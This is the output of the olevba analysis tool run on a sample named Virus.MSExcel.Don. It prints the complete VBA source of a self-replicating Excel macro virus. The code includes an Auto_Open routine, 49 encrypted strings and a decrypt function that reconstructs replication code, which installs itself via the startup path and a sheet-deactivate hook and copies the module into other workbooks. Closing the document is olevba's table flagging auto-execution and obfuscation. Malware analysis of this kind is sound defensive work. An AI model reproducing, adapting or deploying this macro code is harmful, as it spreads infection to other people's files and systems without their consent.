olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Don-2f72846fa99311b6778d5dd737c5a368f6318b3b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DON.bas 
in file: Virus.MSExcel.Don-2f72846fa99311b6778d5dd737c5a368f6318b3b - OLE stream: '_VBA_PROJECT_CUR/VBA/DON'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim DON$(48)

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Dim k0$, j0$, a0$, b0$
Dim mo As Module
Set w = Application.ActiveWorkbook
Open "\DON2.txt" For Output As #1
Print #1, w.Name
Close #1: a0$ = ActiveWorkbook.Path
b0$ = Application.StartupPath
ChDir b0$: dat0$ = Dir(b0$ + "\" + "*.don"): ChDir a0$
If w.Name = dat0$ Then
    Application.OnSheetDeactivate = Workbooks(dat0$).Name & "!DON.Auto_Open"
End If
Application.ScreenUpdating = False
Windows(dat0$).Visible = True
DON$(0) = "Øúç¥×êõñîèæùê¶­®"
DON$(1) = "Ôó¥Ê÷÷ô÷¥×êøúòê¥Óêýù"
DON$(2) = "Éîò¥é©±¥ê©±¥Ó©±¥í©±¥ð©±¥éæù©±¥æ¶©±¥æ·©"
DON$(3) = "Øêù¥æ¥Â¥Æõõñîèæùîôó³ÆèùîûêÜô÷ðçôôð"
DON$(4) = "æ·©¥Â¥Æõõñîèæùîôó³ÉêëæúñùËîñêÕæùí"
DON$(5) = "é©¥Â¥Æõõñîèæùîôó³Úøê÷Óæòê"
DON$(6) = "ê©¥Â¥Òîé©­é©±¥¶±¥¶®"
DON$(7) = "Îë¥ê©¥ÁÃ¥Èí÷©­¸·®¥Ùíêó"
DON$(8) = "¥¥óó¥Â¥×óé­®¿¥Ó©¥Â¥§á§¥°¥ÑÙ÷îò©­×Ù÷îò©­×îìíù©­Øù÷©­óó®±¥º®®®¥°¥§³éôó§¿¥í©¥Â¥×îìíù©­Ó©±¥¾®"
DON$(9) = "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­æ³Óæòê®³ØæûêÈôõþÆø¥Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¥°¥Ó©"
DON$(10) = "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø³Ôõêó¥­Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¥°¥Ó©®"
DON$(11) = "¥¥Øíêêùø­§×êõñîèæùê§®³Øêñêèù"
DON$(12) = "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ëæñøê"
DON$(13) = "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Éêñêùê"
DON$(14) = "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ù÷úê"
DON$(15) = "¥¥Üîóéôüø­í©®³Ûîøîçñê¥Â¥Ëæñøê"
DON$(16) = "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­í©®³Øæûê¿¥ð©¥Â¥Èí÷©­¸·®¥°¥é©"
DON$(17) = "¥¥Üîùí¥Æõõñîèæùîôó"
DON$(18) = "¥¥¥¥³Úøê÷Óæòê¥Â¥ð©"
DON$(19) = "¥¥Êóé¥Üîùí"
DON$(20) = "Êóé¥Îë"
DON$(21) = "Ôõêó¥§áÉÔÓ·³ùýù§¥Ëô÷¥Îóõúù¥Æø¥¨¶"
DON$(22) = "Ñîóê¥Îóõúù¥¨¶±¥ØíêêùÓæòê©"
DON$(23) = "Èñôøê¥¨¶"
DON$(24) = "Ëô÷¥ò¥Â¥¶¥Ùô¥Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Òôéúñêø³Èôúóù"
DON$(25) = "Îë¥Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Òôéúñêø­ò®³Óæòê¥Â¥§ÉÔÓ§¥Ùíêó"
DON$(26) = "¥¥ÉÕ¥Â¥¶"
DON$(27) = "Êóé¥Îë"
DON$(28) = "Óêýù¥ò"
DON$(29) = "Îë¥ÉÕ¥Â¥µ¥Ùíêó"
DON$(30) = "¥¥æ¶©¥Â¥Æõõñîèæùîôó³Øùæ÷ùúõÕæùí¿¥ÈíÉî÷¥æ¶©"
DON$(31) = "¥¥éæù©¥Â¥Éî÷­æ¶©¥°¥§á§°¥§¯³éôó§®"
DON$(32) = "¥¥ÈíÉî÷©¥æ·©¿¥Üîóéôüø­ØíêêùÓæòê©®³Ûîøîçñê¥Â¥Ù÷úê¿¥Üîóéôüø­ØíêêùÓæòê©®³Æèùîûæùê"
DON$(33) = "¥¥ÆèùîûêÜô÷ðçôôð³Òôéúñêø³Æéé"
DON$(34) = "¥¥Øêù¥ù¥Â¥Æõõñîèæùîôó³ÆèùîûêØíêêù"
DON$(35) = "¥¥Æõõñîèæùîôó³Üô÷ðçôôðø­éæù©®³Òôéúñêø­§ÉÔÓ§®³Èôõþ¥æëùê÷¿ÂÆèùîûêÜô÷ðçôôð³Òôéúñêø­¶®"
DON$(36) = "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ëæñøê"
DON$(37) = "¥¥Øíêêùø­ù³Óæòê®³Øêñêèù"
DON$(38) = "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Éêñêùê"
DON$(39) = "¥¥Øíêêùø­§ÉÔÓ§®³Øêñêèù"
DON$(40) = "¥¥ÆèùîûêÜîóéôü³ØêñêèùêéØíêêùø³Ûîøîçñê¥Â¥Ëæñøê"
DON$(41) = "¥¥Æõõñîèæùîôó³ÆèùîûêÜô÷ðçôôð³Øæûê"
DON$(42) = "¥¥Üîóéôüø­éæù©®³Æèùîûæùê¿¥Øíêêùø­§×êõñîèæùê§®³Éêñêùê"
DON$(43) = "¥¥Æõõñîèæùîôó³ÉîøõñæþÆñê÷ùø¥Â¥Ù÷úê"
DON$(44) = "¥¥Üîóéôüø­ØíêêùÓæòê©®³Ûîøîçñê¥Â¥Ù÷úê"
DON$(45) = "Êóé¥Îë"
DON$(46) = "Æõõñîèæùîôó³Üô÷ðçôôðø­ØíêêùÓæòê©®³Øæûê"
DON$(47) = "Ðîññ¥§áÉÔÓ³ùýù§¿¥Ðîññ¥§áÉÔÓ·³ùýù§"
DON$(48) = "Êóé¥Øúç"
Open "\DON.txt" For Output As #1
    For X = 0 To 48
        j0$ = decrypt(DON$(X))
        Print #1, j0$
    Next X
Close #1
Modules.Add: Randomize
ActiveSheet.InsertFile Filename:="\DON.txt"
Set N = Application.ActiveSheet
Sheets(N.Name).Name = "Replicate"
For Each mo In Modules
    Run mo.Name + "!Replicate1"
Next
Application.DisplayAlerts = False
Sheets("Replicate").Select
ActiveWindow.SelectedSheets.Delete
Application.DisplayAlerts = True
Windows(dat0$).Save
Windows(dat0$).Visible = False
Application.ScreenUpdating = True
'DON by NJ [SLAM]
End Sub

Function decrypt(k0$)
Attribute decrypt.VB_ProcData.VB_Invoke_Func = " \n14"
For i = 1 To Len(k0$)
    b = Asc(Mid$(k0$, i, 1))
    If b = 121 Then b = 13
    c = b - 133
    If c < 0 Then GoTo Continue
    d0$ = d0$ + Chr$(c)
Continue:
Next i
decrypt = d0$
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     10 BOUNDSHEET : Sheet Information - Visual Basic module, hidden - DON
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle2
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle4
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle5
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle6
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle7
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle8
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle9
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle10
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle11
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle12
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle13
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle14
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle15
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Tabelle16
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

